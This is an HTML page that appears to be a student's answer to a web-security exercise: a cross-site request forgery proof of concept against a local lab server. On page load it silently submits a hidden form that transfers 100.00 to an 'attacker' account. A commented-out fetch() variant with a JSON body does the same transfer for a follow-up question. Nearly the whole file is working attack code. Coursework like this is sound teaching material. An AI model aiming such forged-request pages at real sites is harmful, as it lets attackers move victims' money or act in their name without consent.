<!DOCTYPE html>
<html>
<form action="http://localhost/api/transfer" method="POST">
    <input type="hidden" name="receiver" value="attacker">
    <input type="hidden" name="amount" value="100.00">
</form>
<script>
    
window.onload = () => {
    document.forms[0].submit();
    //transfer();
}
//for question 1.3 uncomment transfer and comment the other line
let data = {
      receiver: "attacker",
      amount: 100,
    };
async function transfer() {
  alert("lets transfer :0")
    let res = await fetch("http://localhost/api/transfer", {
      method: "POST",
      body: JSON.stringify(data),
      headers: {
        "Content-Type": "application/json",
      },
    });

    if ((await res.status) === 201) {
      alert("Transfer successful!");
      window.location.href = "/";
    } else {
      let json = await res.json();
      alert("Transfer failed: " + json["status"] + "");
    }
  }



</script>
</html>
